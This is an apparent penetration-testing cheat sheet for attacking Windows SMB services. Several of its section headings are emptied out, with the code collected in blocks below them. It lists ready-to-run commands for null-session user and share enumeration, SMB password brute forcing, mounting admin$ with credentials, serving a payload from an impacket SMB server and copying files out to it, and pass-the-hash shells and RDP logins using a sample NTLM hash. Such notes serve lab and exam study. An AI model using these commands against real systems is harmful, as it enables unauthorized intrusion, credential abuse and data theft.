<https://highon.coffee/blog/enum4linux-cheat-sheet/>

mount -t cifs "//10.11.1.49/admin$" /mnt/windows/ -o username=bethany\alice,domain=workgroup,password=loading1 --verbose

## SMB Enum


## Fingerprint SMB version


## Find open SMB Shares


## Enumerate SMB Users


## SMB Server


## Pass the hash
**SMB**
In order to use pass the hash, we first need to put the hash in a env variable using the export command:


So we will atuhenticate against a smb-service.


I think you can run it like this too:


**Remote Desktop**


## Exploits
EternalBlue (MS17-010)

```sh
nmblookup -A 10.1.1.1

smbclient //MOUNT/share -I 10.1.1.1 -N
# connect to share, -N no password prompt

smbclient -L \\10.11.1.1 -U bob -S off
rpcclient -p 139 -U "bob" -S off 10.11.1.1
# disable message signing

rpcclient -U "" 10.1.1.1
# works on older windows versions

enum4linux 10.1.1.1
# discover Windows/Samba servers on subnet, finds Windows MAC addresses, netbios name & discover client workgroup/domain

nbtscan 10.1.1.0/24
# do everything, runs all options apart from dictionary based share name guessing

enum4linux -a 10.1.1.1
# performs all basic enumeration using smb null session

enum4linux -U 192.168.1.2   
#-You will get userlist
# SMB null session is an unauthenticated netbios session between two computers.
# SMB null session is available for SMB1 systems only i.e 2000,xp,2003

#To use an smb null session :
rpcclient -U "" 192.168.1.2
#when asked enter empty password
rpcclient $>srvinfo
rpcclient $>enumdomusers
rpcclient $>querydominfo
rpcclient $>getdompwinfo
#password policy
rpcclient $>netshareenum
nmblookup -A 192.168.1.1
rpcinfo -p <target>

#Enumerate using smbclinet:
smbclient -L //192.168.1.2
smbclient -L //192.168.1.2/myshare -U anonymous

smb> get data.txt
smb>put evil.txt

#Brute SMB password:
nmap -p445 --script=smb-brute.nse <ip>

# Brute force should always be your last option. 
# You can also use hydra to do it.

#Using nmap:
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.1.200-254

nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24

nmap -sSU -script smb-os-discovery.nse -p U:137,T:139,445 --script-args=smbsign=disable,smbuser=username,smbpass=password -oA 10.11.1.5_smbos -vv -n -Pn 10.11.1.5

nmap -sSU -script smb-vuln\* -p U:137,T:139,445 --script-args=smbsign=disable,smbuser=username,smbpass=password -oA 10.11.1.5_smbvuln -vv -n -Pn 10.11.1.5

nmap -sSU -script smb-enum\* -p U:137,T:139,445 --script-args=smbuser=username,smbpass=password -oA 10.11.1.5_smbenum -vv -n -Pn 10.11.1.5
```

```sh
None
```

```sh
nmap -oA 192.168.1.0_shares --script=smb-enum-shares --script-args=smbuser=username,smbpass=password -p445 192.168.1.0/24   
# possible techniques - specify no creds, empty creds, correct creds and incorrect creds

smbclient -L //192.168.1.100 -N
#list shares with no password prompt
```

```sh
nmap --script=smb-enum-users -sSU -pU:137,T:139 -oA 192.168.1.200-254_smbusers 192.168.11.200-254 
```

```sh
python /usr/share/doc/python-impacket/examples/smbserver.py probfine ./

#Get
copy \\10.1.1.1\probfine\payload .

#Put
copy C:\coolinfo \\10.1.1.1\probfine\
```

```sh
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
```

```sh
pth-winexe -U administrator //192.168.1.101 cmd
```

```sh
pth-winexe -U admin/hash:has //192.168.0.101 cmd
```

```sh
apt-get update
apt-get install freerdp-x11

xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
```
